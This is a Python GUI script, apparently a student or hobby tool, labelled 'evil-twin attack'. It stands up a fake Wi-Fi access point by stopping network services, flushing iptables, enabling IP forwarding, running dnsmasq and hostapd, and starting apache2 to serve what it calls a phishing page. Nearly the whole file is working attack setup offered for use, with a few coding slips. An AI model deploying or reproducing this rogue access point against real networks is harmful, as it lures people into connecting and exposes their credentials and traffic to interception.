import os
import sys
import time
import PySimpleGUI as sg
import threading

global window
global sniffer_interface
global network_name
sniffer_interface = sys.argv[1]
network_name = sys.argv[2]


def gui_line_printer(str):
    global window
    os.system(str)
    time.sleep(0.2)
    window['_printer_'].update(str)
    window.refresh()


def reset_network():
    try:
        print("removing dnsmasq.conf")
        os.remove("dnsmasq.conf")
    except OSError:
        print("removing dnsmasq.conf failed")
    try:
        print("removing hostapd.conf")
        os.remove("hostapd.conf")
    except OSError:
        print("removing hostapd.conf failed")

        # cleaning
    gui_line_printer('service NetworkManager start')
    gui_line_printer('service hostapd stop')
    gui_line_printer('service apache2 stop')
    gui_line_printer('service dnsmasq stop')
    gui_line_printer('service rpcbind stop')
    gui_line_printer('killall dnsmasq')
    gui_line_printer('killall hostapd')
    gui_line_printer('systemctl enable systemd-resolved.service')
    gui_line_printer('systemctl start systemd-resolved')


def main():
    global sniffer_interface
    global network_name
    global window
    sniffer_interface = sys.argv[1]
    network_name = sys.argv[2]

    layout = [[sg.Text('Choose name for create Fake ap ')],
              [sg.Input(key='Fake_name')],
              [sg.Button('select name'), sg.Button('Cancel')]]

    window = sg.Window('evil-twin attack', layout
                       , finalize=True)

    while True:
        event, values = window.read()
        if event == 'select name':
            if values['Fake_name'] == "":
                network_name = values['Fake_name']
            window.close
            layout = [[sg.Text('Choose name for fake ap  ')],
                      [sg.Text('command run')],
                      [sg.Text('', key='_printer_', size=(60, 1), justification='center', text_color='blue',
                               background_color='white')],
                      [sg.Button('Cancel')]]

            window = sg.Window('evil-twin attack', layout
                               , finalize=True)
            time.sleep(0.3)
            ap_thread = threading.Thread(target=commands_before_attack())  # run a script to find all connected adapters
            ap_thread.daemon = True
            ap_thread.start()

        if event == sg.WIN_CLOSED or event == 'Cancel':  # if user closes window or clicks cancel
            reset_network()
            break


def commands_before_attack():
    global sniffer_interface
    global network_name
    global window

    gui_line_printer('systemctl disable systemd-resolved.service')
    gui_line_printer('systemctl stop systemd-resolved')

    gui_line_printer('service NetworkManager stop')

    # AP with address 10.0.0.1 with free 8 bits
    ifconfig = "ifconfig " + sniffer_interface + " 10.0.0.1 netmask 255.255.255.0"

    gui_line_printer('airmon-ng check kill')
    gui_line_printer(ifconfig)

    # create fake gw
    gui_line_printer('route add default gw 10.0.0.1')

    # enable ip forwarding
    gui_line_printer('echo 1 > /proc/sys/net/ipv4/ip_forward')

    # clear firewall ruled which might block some request
    gui_line_printer('iptables --flush')
    gui_line_printer('iptables --table nat --flush')
    gui_line_printer('iptables --delete-chain')
    gui_line_printer('iptables --table nat --delete-chain')

    # enable forwarding
    gui_line_printer('iptables -P FORWARD ACCEPT')  #

    line = "python3 Conf_File_Server.py " + sniffer_interface + " " + network_name
    gui_line_printer(line)

    # start the AP
    gui_line_printer('dnsmasq -C dnsmasq.conf')
    gui_line_printer('hostapd hostapd.conf -B')

    # start the server for to broadcast our default page
    gui_line_printer('service apache2 start')
    gui_line_printer('route add default gw 10.0.0.1')  # create fake gw
    time.sleep(1)
    print('---> Phishing page loaded \n')


if __name__ == '__main__':
    main()
